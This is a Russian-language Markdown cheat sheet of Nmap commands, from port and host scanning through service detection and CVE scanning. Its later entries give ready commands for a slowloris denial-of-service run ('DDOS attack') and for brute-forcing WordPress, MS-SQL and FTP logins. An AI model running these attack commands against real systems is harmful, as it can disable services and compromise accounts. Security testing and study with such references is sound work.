# Nmap

[Установка](https://nmap.org/download "САЙТ")

[Документация](https://nmap.org/man/ru/ "САЙТ")


### Использование

* **Cканирование портов**
```
nmap -p 80 X.X.X.X
nmap -p 1-65535 localhost
nmap -p 80,443 8.8.8.8
```

* **Обычное сканирование хоста**
```
nmap 1.1.1.1
nmap 1.1.1.1 8.8.8.8
nmap 1.1.1.1,2,3,4
nmap 8.8.8.0/28
nmap 8.8.8.*
nmap -p 8.8.8.* --exclude 8.8.8.1
nmap -iL list.txt # лист с хостами в файле
```

* **Сканирование хостов путем пинга**
```
nmap -sp 192.168.5.0/24
```

* **Сохранить результат сканирование в файл**
```
nmap -oN output.txt securitytrails.com # plain text
nmap -oX output.xml securitytrails.com # xml
```

* **Отключение резолва DNS для ускорения сканирования `-n`**
```
nmap -p 80 -n 8.8.8.8
```

* **Быстрое сканирование ОС и сервиса `-A` + `-T4`**
```
nmap -A -T4 cloudflare.com
```

* **Сканирование версии сервиса/демона**
```
nmap -sV localhost
```

* **Сканирование tcp/udp**
```
nmap -sT 192.168.1.1
nmap -sU localhost
```

* **Поиск известнвых CVE уязвимостей с помощью скрипта**
```
nmap -Pn --script vuln 192.168.1.105
```

* **DDOS атака с помощью nmap**
```
nmap 192.168.1.105 -max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true
```

* **Brute force атака Wordpress**
```
nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true' 192.168.1.105
```

* **Brute force атака MS-SQL**
```
nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt 192.168.1.105
```

* **Brute force атака FTP**
```
nmap --script ftp-brute -p 21 192.168.1.105
```

* **Поиск backdoor/malware infections**
```
nmap -sV --script=http-malware-host 192.168.1.105 # common
nmap -p80 --script http-google-malware infectedsite.com # google clock malware
```
